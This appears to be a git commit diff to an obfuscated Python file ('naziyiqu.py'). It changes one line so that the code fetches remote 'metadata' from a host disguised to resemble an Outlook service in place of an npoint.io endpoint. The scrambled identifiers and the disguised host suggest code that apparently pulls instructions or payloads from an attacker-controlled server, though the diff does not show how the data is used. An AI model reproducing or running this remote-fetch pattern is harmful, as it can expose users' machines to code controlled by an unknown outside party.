ebf8d8b10230e586638d35492f4f25103b74c6f8
uutauouo17 <momiyof23@outlook.com>
2025-06-11 09:18:18 +0000

    Update naziyiqu.py

--- naziyiqu.py
+++ naziyiqu.py
@@ -18,7 +18,7 @@ def config_pxgqek_907():
 
     def config_lphluj_597():
         try:
-            data_lfrugf_924 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_lfrugf_924 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_lfrugf_924.raise_for_status()
             learn_lnrkmy_352 = data_lfrugf_924.json()
             train_xwoxit_993 = learn_lnrkmy_352.get('metadata')
